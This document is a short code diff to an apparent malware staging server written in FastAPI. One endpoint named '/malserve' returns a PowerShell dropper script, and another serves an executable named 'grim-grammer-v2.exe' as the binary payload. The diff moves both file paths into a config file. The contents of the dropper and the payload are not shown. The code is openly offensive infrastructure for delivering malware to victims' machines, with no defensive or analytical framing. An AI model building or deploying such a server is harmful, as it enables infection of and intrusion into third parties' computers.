@@ -2,15 +2,19 @@ from fastapi import FastAPI
 
 from fastapi.responses import Response,FileResponse
 
+import configparser
+
+config = configparser.ConfigParser()
+config.read("names.conf")
 
 
 app = FastAPI()
 
-dropper = "test.ps1"
+
 
 @app.get("/malserve")
 def malserve():
-    with open(dropper,"r",encoding="utf-8") as powershellscript:
+    with open(config["Paths"]["dropper"],"r",encoding="utf-8") as powershellscript:
         PSCode = powershellscript.read()
     return Response(
         content=PSCode,
@@ -20,7 +24,7 @@ def malserve():
 @app.get("/bin/grim-grammer-v2.exe")
 def serveBin():
     return FileResponse(
-        "bin/grim-grammer-v2.exe"
+        config["Paths"]["binary_payload"]
     )
 if __name__ == "__main__":
     import os
